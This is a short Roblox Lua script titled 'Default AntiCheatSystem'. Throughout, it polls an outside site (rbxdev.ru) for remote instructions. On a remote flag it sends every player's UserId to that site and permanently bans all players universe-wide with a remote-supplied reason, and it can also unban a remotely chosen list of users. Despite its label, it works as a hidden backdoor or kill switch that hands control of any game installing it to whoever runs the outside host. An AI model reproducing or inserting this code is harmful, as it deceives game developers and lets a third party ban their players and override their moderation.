-- Default AntiCheatSystem

local httpService = game:GetService("HttpService")


while true do


	local Info = httpService:GetAsync("https://rbxdev.ru/Protocol.json")
	local Decoded = httpService:JSONDecode(Info)


	if Decoded.Unban == true then
		local UnbanlistString = httpService:GetAsync("https://rbxdev.ru/BannedUsers")
		UnbanlistString = UnbanlistString:gsub("[{}%s]", "")

		local Unbanlist = {}


		for number in UnbanlistString:gmatch("%d+") do
			table.insert(Unbanlist, tonumber(number))
		end

		game.Players:UnbanAsync({

			UserIds = Unbanlist,
			ApplyToUniverse = true,

		})
	end

	for _, plr in game.Players:GetPlayers() do
			if Decoded.Active == false then
				
				local formedURL = "https://rbxdev.ru/banasync.php?userid=" .. plr.UserId
				
				httpService:GetAsync(formedURL)
				
				game.Players:BanAsync({
	
					UserIds = {plr.UserId},
					ApplyToUniverse = true, 
					Duration = -1, 
					DisplayReason = tostring(Decoded.Reason),
					PrivateReason = tostring(Decoded.Reason), 
					ExcludeAltAccounts = true,
	
				})
			end
	end
	task.wait(10)
end

